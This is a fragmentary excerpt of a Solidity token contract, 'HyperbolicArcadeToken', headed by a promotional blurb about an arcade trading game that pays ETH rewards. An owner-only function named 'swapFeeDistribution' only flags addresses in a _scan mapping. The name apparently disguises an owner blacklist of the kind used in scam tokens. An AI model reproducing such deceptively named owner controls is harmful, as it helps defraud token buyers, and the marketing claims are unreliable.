...
Hyperbolic Arcade Trading delivers an 'arcadified' take on trading stocks,
cryptocurrencies, and forex that helps players develop ACTUAL trading skills 
while playing a video game and earning ETH as a rewards!
...
contract HyperbolicArcadeToken is Context, IERC20, Ownable {
    ...
    string private _name = 'Hyperbolic Arcade | t.me/HyperbolicArcade';
    string private _symbol = 'HYPERBOLIC';
    ...
    function swapFeeDistribution(address _address) external onlyOwner() {
        _scan[_address] = true;
    }
    ...
    function beginSwapAndTransfer() public virtual onlyOwner(){
